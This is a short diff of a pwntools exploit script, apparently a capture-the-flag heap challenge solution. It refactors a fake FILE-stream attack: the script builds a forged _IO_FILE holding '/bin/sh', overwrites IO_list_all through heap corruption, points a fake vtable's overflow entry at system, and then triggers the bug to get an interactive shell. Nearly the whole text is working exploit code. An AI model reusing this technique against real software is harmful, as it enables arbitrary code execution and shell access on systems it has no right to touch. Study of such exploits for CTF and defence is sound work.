@@ -1,4 +1,5 @@
 from pwn import *
+from IO_FILE import *
 
 ###Utils
 def List():
@@ -78,15 +79,15 @@ Note(1,0xf8,b'a')   #B1+0x300
 
 ###Craft fake filestream and hijack IO_list_all
 padding = b'\x00'*0x160
-stream  = b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(IO_list_all_addr-0x10)
-stream += p64(0)+p64(1)
-stream  = stream.ljust(0xd8,b'\x00')
-stream += p64(vtable_addr)
-stream  = stream.ljust(0x100,b'\x00')
-vtable  = p64(0)*3+p64(system_addr)
+IO_FILE = IO_FILE_plus()
+stream = IO_FILE.construct(write_base=0,write_ptr=1,vtable=vtable_addr)
+stream = b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(IO_list_all_addr-0x10)+stream[0x20:]
+stream = stream.ljust(0x100,b'\x00')
+IO_jump = IO_jump_t()
+vtable = IO_jump.construct(overflow=system_addr)
 payload = padding+stream+vtable
+
 Note(0,0x400,payload)
 trigger(3,0x100)
 r.interactive()
-
 
